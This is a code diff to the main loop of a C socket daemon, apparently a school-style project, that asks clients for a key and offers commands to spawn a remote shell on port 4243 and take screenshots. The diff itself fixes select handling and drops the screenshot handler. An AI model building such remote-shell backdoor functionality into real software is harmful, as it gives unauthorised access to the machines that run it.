@@ -184,7 +184,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 		FD_SET(connexion->master_socket, &users.readfds);
 		users.max_sd = connexion->master_socket;
 
-		for ( users.i = 0 ; users.i < MAX_CLIENT; users.i++)
+		for (users.i = 0 ; users.i < MAX_CLIENT; users.i++)
 		{
 			users.sd = connexion->client_socket[users.i];
 			if (users.sd > 0)
@@ -195,22 +195,17 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 		users.activity = select(users.max_sd + 1 , &users.readfds , NULL , NULL , NULL);
 		//if ((activity < 0) && (errno!=EINTR))
 			////printf("select error");
-
-
 		if (new_client(connexion, &users) == false)
 			return (false);
-
-
 		for (users.i = 0; users.i < MAX_CLIENT; users.i++)
 		{
 			users.sd = connexion->client_socket[users.i];
-			if (users.key[users.i] == false)
+			if (FD_ISSET(users.sd , &users.readfds) && users.key[users.i] == false)
 				send(users.sd, "KEY: ", 5, 0);
 			if (FD_ISSET(users.sd , &users.readfds))
 			{
 				if (users.key[users.i] == true)
 					send(users.sd, "> ", 2, 0);
-
 				if ((valrecv = recv(users.sd , buffer, BUFFSIZE, 0)) == 0)
 				{
 					close(users.sd);
@@ -238,9 +233,7 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 							users.nb_user--;
 						}
 						if (!strcmp(buffer, "?"))
-							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screenshot\n> ", 66, 0);
-						else if (!strcmp(buffer, "screen"))
-							screenshot(&users, envp);
+							send(users.sd, "\n'shell'\tSpawn remote shell on 4243\n'screenshot'	take screen\n> ", 63, 0);
 						else if (!strcmp(buffer, "shell"))
 							spawn_shell(&users, envp);
 						else if (strlen(buffer))
@@ -253,14 +246,10 @@ bool	run_daemon(t_connexion *connexion, char **envp)
 			{
 				if (connexion->client_socket[j] != 0)
 					break;
-				else if (j == 2)
-				{
-					/*tintin->write_log("All client disconnected.", "\033[1;32mINFO\033[0m");*/
-					return (true);
-				}
+				/*else if (j == 2)*/
+					/*return (true);*/
 			}
 		}
 	}
 	return (true);
-
 }
